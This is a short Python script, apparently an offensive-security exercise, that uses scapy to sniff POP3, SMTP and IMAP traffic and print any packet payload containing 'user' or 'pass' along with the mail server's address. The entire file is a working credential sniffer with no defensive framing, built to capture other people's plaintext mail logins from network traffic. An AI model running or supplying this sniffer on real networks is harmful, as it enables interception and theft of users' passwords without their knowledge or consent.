from scapy.all import *


# our packet callback
def packet_callback(pack):
    if pack[TCP].payload:
        mail_packet = bytes(pack[TCP].payload).decode('utf-8')
        if "user" in mail_packet.lower() or "pass" in mail_packet.lower():
            print(f"[*] Server: {pack[IP].dst}")
            print(f"[*] {mail_packet}")


# fire up our sniffer
sniff(filter='tcp port 110 or tcp port 25 or tcp port 143', prn=packet_callback, store=0)
